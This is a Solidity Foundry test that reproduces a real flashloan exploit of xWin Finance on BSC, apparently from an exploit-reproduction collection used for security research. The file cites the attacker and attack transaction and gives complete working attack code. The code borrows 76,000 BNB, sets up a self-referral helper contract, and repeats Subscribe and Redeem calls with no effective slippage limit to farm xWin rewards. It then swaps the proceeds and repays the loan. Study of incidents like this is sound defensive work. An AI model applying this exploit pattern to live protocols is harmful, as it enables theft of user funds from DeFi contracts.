// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Attacker : https://bscscan.com/address/0xb63f0d8b9aa0c4e68d5630f54bfefc6cf2c2ad19
// Attack Contract : https://bscscan.com/address/0x67d3737c410f4d206012cad5cb41b2e155061945
// Attack Tx : https://bscscan.com/tx/0xba0fa8c150b2408eec9bbbbfe63f9ca63e99f3ff53ac46ee08d691883ac05c1d
// @Analysis
// https://peckshield.medium.com/xwin-finance-incident-root-cause-analysis-71d0820e6bc1
// @Summary
// This incident was due to an invalid slippage control in the protocol, which is exploited in a flashloan to obtain extra xWin rewards.

import "forge-std/Test.sol";
import "./../interface.sol";

struct TradeParams {
    address xFundAddress;
    uint256 amount;
    uint256 priceImpactTolerance;
    uint256 deadline;
    bool returnInBase;
    address referral;
}

interface IBank {
    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface IxWinDefi {
    function Subscribe(TradeParams memory _tradeParams) external payable;
    function Redeem(TradeParams memory _tradeParams) external payable;
    function WithdrawReward() external payable;
}

contract SimpleAccount {
    IxWinDefi xWinDefi = IxWinDefi(0x1Bf7fe7568211ecfF68B6bC7CCAd31eCd8fe8092);

    IERC20 PCLPXWIN = IERC20(0x8f52e0C41164169818C1FB04B263FDC7c1e56088);
    IERC20 XWIN = IERC20(0xd88ca08d8eec1E9E09562213Ae83A7853ebB5d28);

    address private owner;

    constructor() {
        owner = msg.sender;
    }

    fallback() external payable {}

    function subscribe() public {
        require(msg.sender == owner, "only owner");
        uint256 bnbbalance = address(this).balance;
        TradeParams memory tradeParams = TradeParams({
            xFundAddress: address(PCLPXWIN),
            amount: bnbbalance,
            priceImpactTolerance: 10_000,
            deadline: 10_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000,
            returnInBase: false,
            referral: 0x0000000000000000000000000000000000000000
        });
        xWinDefi.Subscribe{value: 11}(tradeParams);
    }

    function withdrawRewards() external {
        require(msg.sender == owner, "only owner");
        xWinDefi.WithdrawReward();
        XWIN.transfer(address(owner), XWIN.balanceOf(address(this)));
    }
}

contract XWinExpTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IBank bank = IBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);
    IxWinDefi xWinDefi = IxWinDefi(0x1Bf7fe7568211ecfF68B6bC7CCAd31eCd8fe8092);

    IPancakePair xwinwbnbpair = IPancakePair(0x2D74b7DbF2835aCadd8d4eF75B841c01E1a68383);
    IPancakePair xwinwbnbpair2 = IPancakePair(0xD4A3Dcf47887636B19eD1b54AAb722Bd620e5fb4);

    IERC20 XWIN = IERC20(0xd88ca08d8eec1E9E09562213Ae83A7853ebB5d28);
    WETH9 WBNB = WETH9(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 PCLPXWIN = IERC20(0x8f52e0C41164169818C1FB04B263FDC7c1e56088);

    address payable private repayAddr = payable(0xc78248D676DeBB4597e88071D3d889eCA70E5469);

    function setUp() public {
        cheat.createSelectFork("bsc", 8_589_725);
        deal(address(this), 0);
    }

    function testExploit() external {
        bank.flashloan(address(this), 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB, 76_000_000_000_000_000_000_000, "");
        emit log_named_decimal_uint("Attacker BNB balance after exploit", address(this).balance, 18);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {
        require(address(this).balance == 76_000_000_000_000_000_000_000, "error");
        SimpleAccount account1 = new SimpleAccount();
        payable(address(account1)).call{value: 11}("");
        account1.subscribe();
        for (uint256 i = 0; i < 20; i++) {
            uint256 bnbbalance = address(this).balance;
            TradeParams memory tradeParams = TradeParams({
                xFundAddress: address(PCLPXWIN),
                amount: bnbbalance,
                priceImpactTolerance: 10_000,
                deadline: 10_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000,
                returnInBase: false,
                referral: address(account1)
            });
            xWinDefi.Subscribe{value: bnbbalance}(tradeParams);

            (uint112 reserve0, uint112 reserve1,) = xwinwbnbpair.getReserves();
            uint256 xwinbalance = XWIN.balanceOf(address(this));
            uint256 wbnbout = getAmountOut(xwinbalance, reserve1, reserve0);
            XWIN.transfer(address(xwinwbnbpair), xwinbalance);

            xwinwbnbpair.swap(wbnbout, 0, address(this), "");
            WBNB.withdraw(WBNB.balanceOf(address(this)));
            //            emit log_named_decimal_uint(
            //                "Attacker BNB balance in exploit",
            //                bnbbalance,
            //                18
            //            );
            redeem();
        }

        account1.withdrawRewards();
        emit log_named_decimal_uint(
            "Attacker XWIN balance after exploit", XWIN.balanceOf(address(this)), XWIN.decimals()
        );
        uint256 xwinbalance = XWIN.balanceOf(address(this));
        (uint112 reserve0, uint112 reserve1,) = xwinwbnbpair2.getReserves();
        uint256 wbnbout = getAmountOut(xwinbalance, reserve1, reserve0);
        XWIN.transfer(address(xwinwbnbpair2), xwinbalance);
        xwinwbnbpair2.swap(wbnbout, 0, address(this), "");

        require(WBNB.balanceOf(address(this)) > fee, "must great than fee");
        WBNB.withdraw(WBNB.balanceOf(address(this)));

        payable(repayAddr).call{value: amount + fee}("");
    }

    function redeem() public payable {
        PCLPXWIN.approve(
            address(xWinDefi), 1_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000
        );
        uint256 pclpxwinbalance = PCLPXWIN.balanceOf(address(this));
        TradeParams memory tradeParams = TradeParams({
            xFundAddress: address(PCLPXWIN),
            amount: pclpxwinbalance,
            priceImpactTolerance: 10_000,
            deadline: 10_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000,
            returnInBase: false,
            referral: 0x0000000000000000000000000000000000000000
        });
        xWinDefi.Redeem(tradeParams);
    }

    fallback() external payable {}

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "PancakeLibrary: INSUFFICIENT_LIQUIDITY");
        uint256 amountInWithFee = amountIn * (10_000 - 25);
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 10_000 + amountInWithFee;
        amountOut = numerator / denominator;
    }
}
